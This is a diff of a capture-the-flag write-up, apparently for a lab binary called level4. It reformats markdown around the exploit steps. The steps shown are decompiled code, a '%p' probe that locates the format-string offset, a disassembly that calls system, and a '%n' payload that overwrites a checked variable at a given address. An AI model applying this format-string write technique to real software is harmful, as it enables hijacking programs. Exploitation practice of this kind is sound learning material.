@@ -1,9 +1,9 @@
     scp -P 4242 level4@10.11.200.132:/home/user/level4/level4 .
 
-/--------------------------------------------------------/
+<hr>
 
-    Decompilation of the binary:
-
+Decompilation of the binary:
+```
         int32_t main(int32_t argc, char** argv, char** envp)
 
             080484b3  return n()
@@ -23,19 +23,22 @@
         int32_t p(int32_t arg1)
 
             08048456  return printf(arg1)
+```
+<hr>
 
-/--------------------------------------------------------/
+```
 python -c 'print "A"*20 + "%p "*20' | ./level4
 AAAAAAAAAAAAAAAAAAAA0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d
 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x41414141 0x41414141 0x41414141
 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025
-
+```
 A(0x41414141) is written in the 12th parameter
-/--------------------------------------------------------/
+
+<hr>
 Same as before, it looks like we have to write to *m address to verify the value 16930116. 
 
 Dump of assembler code for function n:
-   0x08048457 <+0>:     push   %ebp
+```   0x08048457 <+0>:     push   %ebp
    0x08048458 <+1>:     mov    %esp,%ebp
    0x0804845a <+3>:     sub    $0x218,%esp
    0x08048460 <+9>:     mov    0x8049804,%eax
@@ -52,9 +55,9 @@ Dump of assembler code for function n:
    0x08048497 <+64>:    jne    0x80484a5 <n+78>
    0x08048499 <+66>:    movl   $0x8048590,(%esp)
    0x080484a0 <+73>:    call   0x8048360 <system@plt>
+```
 
-
-0x8049810 -> \x10\x98\x49\x80
+``0x8049810`` -> ``\x10\x98\x49\x80``
 
 Padding now should be 16930116 length - the length of the target address.
 Printf allows us to create this padding on execution by using "%(16930116-4)u%12$n"
